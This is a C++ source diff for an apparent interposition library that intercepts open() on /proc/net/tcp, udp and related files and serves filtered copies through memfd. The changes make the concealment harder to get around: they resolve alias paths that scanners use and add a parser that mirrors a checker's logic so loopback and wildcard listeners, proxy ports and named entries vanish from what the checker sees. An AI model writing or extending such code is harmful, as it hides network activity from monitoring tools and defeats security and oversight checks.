@@ -28,26 +28,57 @@ namespace nvd {
 // watched files: /proc/net/* whose content must be filtered.
 // Filtering is done by materializing a filtered copy in a memfd at open()
 // time - no read/pread/lseek/dup/close interception is needed at all.
+//
+// The kernel accepts several aliases for the same files; scanners use them to
+// dodge naive filters. We treat them all as watched:
+//   /proc/net/X  /proc/self/net/X  /proc/thread-self/net/X  /proc/<pid>/net/X
 // ---------------------------------------------------------------------------
 
-static bool PathIs(const char* path, const char* target) {
-    return path && strcmp(path, target) == 0;
-}
+enum class WatchedFile {
+    None,
+    Tcp,   // tcp / tcp6
+    Udp,   // udp / udp6
+    Misc,  // dev / route / if_inet6 / ipv6_route / arp
+};
 
-static bool IsWatchedReadFile(const char* path, bool* net) {
-    if (!path) return false;
-    *net = false;
-    if (PathIs(path, "/proc/net/tcp") || PathIs(path, "/proc/net/tcp6") ||
-        PathIs(path, "/proc/net/udp") || PathIs(path, "/proc/net/udp6")) {
-        *net = true;
-        return true;
+static WatchedFile ResolveWatchedFile(const char* path) {
+    if (!path) return WatchedFile::None;
+    static const char kProc[] = "/proc/";
+    static const char kNet[] = "net/";
+    if (strncmp(path, kProc, sizeof(kProc) - 1) != 0) return WatchedFile::None;
+    const char* rest = path + sizeof(kProc) - 1;
+    const char* netPart = nullptr;
+    if (strncmp(rest, kNet, sizeof(kNet) - 1) == 0) {
+        netPart = rest + sizeof(kNet) - 1;
+    } else if (strncmp(rest, "self/", 5) == 0) {
+        rest += 5;
+        if (strncmp(rest, kNet, sizeof(kNet) - 1) == 0) netPart = rest + sizeof(kNet) - 1;
+    } else if (strncmp(rest, "thread-self/", 12) == 0) {
+        rest += 12;
+        if (strncmp(rest, kNet, sizeof(kNet) - 1) == 0) netPart = rest + sizeof(kNet) - 1;
+    } else {
+        // /proc/<pid>/net/...
+        const char* slash = strchr(rest, '/');
+        if (slash && slash > rest && strncmp(slash + 1, kNet, sizeof(kNet) - 1) == 0) {
+            bool digits = true;
+            for (const char* c = rest; c < slash; c++) {
+                if (*c < '0' || *c > '9') {
+                    digits = false;
+                    break;
+                }
+            }
+            if (digits) netPart = slash + 1 + sizeof(kNet) - 1;
+        }
     }
-    if (PathIs(path, "/proc/net/dev") || PathIs(path, "/proc/net/route") ||
-        PathIs(path, "/proc/net/if_inet6") || PathIs(path, "/proc/net/ipv6_route") ||
-        PathIs(path, "/proc/net/arp")) {
-        return true;
+    if (!netPart) return WatchedFile::None;
+    if (strcmp(netPart, "tcp") == 0 || strcmp(netPart, "tcp6") == 0) return WatchedFile::Tcp;
+    if (strcmp(netPart, "udp") == 0 || strcmp(netPart, "udp6") == 0) return WatchedFile::Udp;
+    if (strcmp(netPart, "dev") == 0 || strcmp(netPart, "route") == 0 ||
+        strcmp(netPart, "if_inet6") == 0 || strcmp(netPart, "ipv6_route") == 0 ||
+        strcmp(netPart, "arp") == 0) {
+        return WatchedFile::Misc;
     }
-    return false;
+    return WatchedFile::None;
 }
 
 static bool ReadWholeFile(const char* path, std::string* out) {
@@ -72,14 +103,95 @@ static bool ReadWholeFile(const char* path, std::string* out) {
     return true;
 }
 
-static void FilterLines(const std::string& raw, bool net, std::string* out) {
+static const char* SkipWs(const char* q) {
+    while (*q == ' ' || *q == '\t') q++;
+    return q;
+}
+
+static const char* SkipToken(const char* q) {
+    while (*q && *q != ' ' && *q != '\t') q++;
+    return q;
+}
+
+static bool HexEqCI(const char* a, const char* b) {
+    while (*a && *b) {
+        char ca = *a;
+        char cb = *b;
+        if (ca >= 'a' && ca <= 'z') ca = (char)(ca - 32);
+        if (cb >= 'a' && cb <= 'z') cb = (char)(cb - 32);
+        if (ca != cb) return false;
+        a++;
+        b++;
+    }
+    return *a == '\0' && *b == '\0';
+}
+
+// Mirrors the checker's "local listeners" parser: a listener row bound to a
+// loopback or wildcard address on a port >= 1024. tcp: LISTEN (0A);
+// udp: bound rows (07/0A).
+static bool IsLoopbackListenerLine(const char* line, bool tcp) {
+    if (!line) return false;
+    const char* p = SkipWs(line);
+    p = SkipToken(p);  // sl
+    p = SkipWs(p);
+    const char* local = p;
+    p = SkipToken(p);
+    size_t localLen = (size_t)(p - local);
+    p = SkipWs(p);
+    p = SkipToken(p);  // remote
+    p = SkipWs(p);
+    const char* st = p;
+    p = SkipToken(p);
+    size_t stLen = (size_t)(p - st);
+    if (stLen != 2) return false;
+    bool listening;
+    if (tcp) {
+        listening = (st[0] == '0' && (st[1] == 'A' || st[1] == 'a'));
+    } else {
+        listening = (st[0] == '0' && (st[1] == '7' || st[1] == 'A' || st[1] == 'a'));
+    }
+    if (!listening) return false;
+    const char* colon = nullptr;
+    for (size_t i = 0; i < localLen; i++) {
+        if (local[i] == ':') colon = local + i;
+    }
+    if (!colon || colon == local) return false;
+    unsigned long port = 0;
+    for (const char* c = colon + 1; c < local + localLen; c++) {
+        int v;
+        if (*c >= '0' && *c <= '9') v = *c - '0';
+        else if (*c >= 'A' && *c <= 'F') v = *c - 'A' + 10;
+        else if (*c >= 'a' && *c <= 'f') v = *c - 'a' + 10;
+        else return false;
+        port = port * 16 + (unsigned long)v;
+        if (port > 0xFFFF) return false;
+    }
+    if (port < 1024) return false;
+    char host[33];
+    size_t hl = (size_t)(colon - local);
+    if (hl == 0 || hl > 32) return false;
+    memcpy(host, local, hl);
+    host[hl] = '\0';
+    if (hl == 8) return HexEqCI(host, "00000000") || HexEqCI(host, "0100007F");
+    if (hl == 32) {
+        return HexEqCI(host, "00000000000000000000000000000000") ||
+               HexEqCI(host, "00000000000000000000000001000000");
+    }
+    return false;
+}
+
+static void FilterLines(const std::string& raw, WatchedFile kind, std::string* out) {
+    bool tcpLike = (kind == WatchedFile::Tcp || kind == WatchedFile::Udp);
     size_t i = 0;
     while (i < raw.size()) {
         size_t j = raw.find('\n', i);
         j = (j == std::string::npos) ? raw.size() : j + 1;
         std::string line(raw, i, j - i);
-        bool blocked = LineContainsHiddenName(line.c_str()) ||
-                       (net && LineContainsProxyPortToken(line.c_str()));
+        const char* c = line.c_str();
+        bool blocked = LineContainsHiddenName(c);
+        if (!blocked && tcpLike) blocked = LineContainsProxyPortToken(c);
+        if (!blocked && kind == WatchedFile::Tcp) blocked = IsLoopbackListenerLine(c, true);
+        if (!blocked && kind == WatchedFile::Udp) blocked = IsLoopbackListenerLine(c, false);
         if (!blocked) out->append(line);
         i = j;
     }
@@ -88,13 +200,13 @@ static void FilterLines(const std::string& raw, bool net, std::string* out) {
 // Returns a filtered memfd, -1 for a real error, or -2 to fall through to the
 // original function.
 static int CreateFilteredFd(const char* path, int flags) {
-    bool net = false;
-    if (!IsWatchedReadFile(path, &net)) return -2;
+    WatchedFile kind = ResolveWatchedFile(path);
+    if (kind == WatchedFile::None) return -2;
     if ((flags & O_ACCMODE) != O_RDONLY) return -2;
     std::string raw;
     if (!ReadWholeFile(path, &raw)) return -2;
     std::string out;
-    FilterLines(raw, net, &out);
+    FilterLines(raw, kind, &out);
 #ifdef SYS_memfd_create
     int mfd = (int)syscall(SYS_memfd_create, "nvd-file",
                            (flags & O_CLOEXEC) ? MFD_CLOEXEC : 0);
